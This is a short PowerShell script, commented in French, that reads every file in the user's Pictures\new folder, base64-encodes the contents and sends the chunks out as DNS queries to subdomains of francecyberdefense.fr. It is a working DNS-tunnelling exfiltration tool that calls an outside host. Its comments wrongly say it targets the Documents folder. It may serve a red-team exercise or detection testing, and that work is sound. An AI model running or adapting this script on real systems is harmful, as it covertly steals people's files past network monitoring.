# Obtenir le chemin du dossier Documents de l'utilisateur en cours
$documentsPath = [environment]::GetFolderPath('MyPictures')

# Obtenir la liste des fichiers dans le dossier Documents
$files = Get-ChildItem -Path "$documentsPath\new" -File

# Fonction pour découper une chaîne en tronçons de taille fixe
function ChunkString($string, $chunkSize) {
    return [regex]::Split($string, "(.{$chunkSize})") | Where-Object { $_ -ne '' }
}

# Parcourir chaque fichier, le lire, le convertir en base64, et envoyer des requêtes DNS
foreach ($file in $files) {
    # Lire le contenu du fichier
    $fileContent = Get-Content -Path $file.FullName -Raw
    # Convertir le contenu en bytes
    $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
    # Convertir les bytes en base64
    $fileBase64 = [Convert]::ToBase64String($fileBytes)
    
    # Découper la chaîne Base64 en tronçons de 64 caractères
    $chunks = ChunkString $fileBase64 64
    
    # Envoyer des requêtes DNS pour chaque tronçon
    foreach ($chunk in $chunks) {
        $subDomain = "$chunk.francecyberdefense.fr"
        Resolve-DnsName -Name $subDomain -Type A
    }
}

